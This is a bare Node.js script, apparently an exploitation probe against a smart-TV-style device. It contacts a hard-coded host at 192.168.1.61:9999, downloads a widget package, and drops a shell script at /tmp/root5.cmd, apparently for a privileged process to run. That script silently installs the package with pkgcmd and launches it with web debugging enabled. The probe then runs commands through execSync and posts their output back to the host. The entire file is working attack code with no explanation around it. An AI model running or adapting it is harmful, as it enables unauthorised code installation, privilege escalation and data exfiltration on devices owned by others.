"use strict";
var cp = null;
try { cp = require('child_process'); } catch (e) {}
var fs = require('fs');
var net = require('net');
var http = require('http');
var HOST='192.168.1.61', PORT=9999;
var BASE='/home/owner/share/tmp/sdk_tools';
var R={ts:new Date().toISOString(), probe:'p150', results:{}, log:[]};
var posted=false;
function L(s){R.log.push(String(s).substring(0,800));}
function postBuf(path,buf){try{var hdr='POST '+path+' HTTP/1.1\r\nHost: '+HOST+':'+PORT+'\r\nContent-Type: application/octet-stream\r\nContent-Length: '+buf.length+'\r\nConnection: close\r\n\r\n';var s=net.connect(PORT,HOST);s.on('connect',function(){s.write(hdr);s.write(buf);setTimeout(function(){s.destroy()},5000)});s.on('error',function(e){L('post err '+e.message)});}catch(e){L('post ctor '+e);}}
function postFinal(){if(posted)return;posted=true;postBuf('/p150info',new Buffer(JSON.stringify(R),'utf8'));}
function run(cmd,timeoutMs,maxLen){maxLen=maxLen||4000;if(!cp)return '[no cp]';try{var out=cp.execSync(cmd,{timeout:timeoutMs||25000,maxBuffer:16*1024*1024}).toString().trim();return '[exit 0] '+out.substring(0,maxLen);}catch(e){var o='';if(e.stdout)o+=e.stdout.toString();if(e.stderr)o+=(o?'\n':'')+e.stderr.toString();return '[exit '+(e.status===undefined?'?':e.status)+'] '+(o||(e&&e.message)||'unknown').substring(0,maxLen);}}

function download(url, dest, cb) {
  try {
    http.get(url, function(res) {
      if (res.statusCode !== 200) { cb('status '+res.statusCode); return; }
      var chunks=[];
      res.on('data', function(c){ chunks.push(c); });
      res.on('end', function(){ var b=Buffer.concat(chunks); try { fs.writeFileSync(dest,b); } catch(e) { cb('write err '+String(e)); return; } cb(null,b.length); });
      res.on('error', function(e){ cb('res err '+e.message); });
    }).on('error', function(e){ cb('req err '+e.message); });
  } catch(e) { cb('exc '+String(e)); }
}

function main(){
  postBuf('/p150start', new Buffer(JSON.stringify({ts:new Date().toISOString(), probe:'p150start'}),'utf8'));
  download('http://192.168.1.61:9999/launcher5.wgt', BASE+'/launcher5.wgt', function(err, len){
    R.results.download = err ? ('ERR '+err) : ('ok '+len);
    if (err) { postFinal(); return; }
    var script='#!/bin/sh\nwhich pkgcmd > '+BASE+'/pkgproof5.txt 2>&1\npkgcmd -i -t wgt -p '+BASE+'/launcher5.wgt -q -G >> '+BASE+'/pkgproof5.txt 2>&1\necho rc=$? >> '+BASE+'/pkgproof5.txt\nsleep 3\nwhich app_launcher >> '+BASE+'/launcherdebug5.txt 2>&1\napp_launcher --start launcherxx.MyLauncher --web-debug >> '+BASE+'/launcherdebug5.txt 2>&1\necho rc=$? >> '+BASE+'/launcherdebug5.txt\n#END\n';
    try { fs.writeFileSync('/tmp/root5.cmd', script); R.results.rootcmd='[written]'; } catch(e){ R.results.rootcmd='ERR '+String(e); }
    R.results.rootcmdls=run('ls -la /tmp/root5.cmd; tail -3 /tmp/root5.cmd 2>&1',10000,1000);
    run('sleep 10',10000,100);
    R.results.proof=run('cat '+BASE+'/pkgproof5.txt 2>&1',10000,6000);
    R.results.debug=run('cat '+BASE+'/launcherdebug5.txt 2>&1',10000,4000);
    R.results.final='done '+new Date().toISOString();
    L('done');
    postFinal();
    setTimeout(postFinal,20000);
  });
}
try{main();}catch(e){R.results.fatal=String(e)+' | '+(e.stack||'no-stack');postFinal();}
